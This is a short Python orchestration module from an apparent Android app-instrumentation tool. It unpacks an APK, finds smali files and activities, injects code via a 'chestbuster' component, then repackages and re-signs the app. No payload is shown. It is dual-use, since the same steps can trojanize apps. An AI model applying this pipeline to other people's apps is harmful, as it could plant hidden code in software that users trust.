# -*- coding: utf-8 -*-
# Called by queen.py

import sys
from pprint import pprint

from ..chestbuster import chestbuster
from .funcs import unpack, find_smalis, detach, find_activities

def run(host_dest, keystore):
  print('  [*] Unpacking the apk')

  # Unpack the apk
  ret = unpack(host_dest)
  if (not ret):
    print('[--!--] Failed to unpack')
    sys.exit()

  # Find target smali files
  print('  [*] Finding targets')
  smalis = find_smalis(host_dest)
  if (not smalis):
    print('[--!--] Failed to find smalis')
    sys.exit()

  # Find activities
  activities = find_activities(host_dest)
  if (activities == []):
    print('[--!--] Failed to find activities')
    sys.exit()
  print('   [+] Activities found: ' + str(len(activities)))

  # Analyze and Inject to smali files
  ret, parsed_data, data_flows = chestbuster.run(smalis, activities)
  if (not ret):
    sys.exit()

  # Repack and resign the apk
  print('  [*] Repackaging the apk')
  ret = detach(host_dest, keystore)
  if (not ret):
    sys.exit()

  return True, parsed_data, data_flows

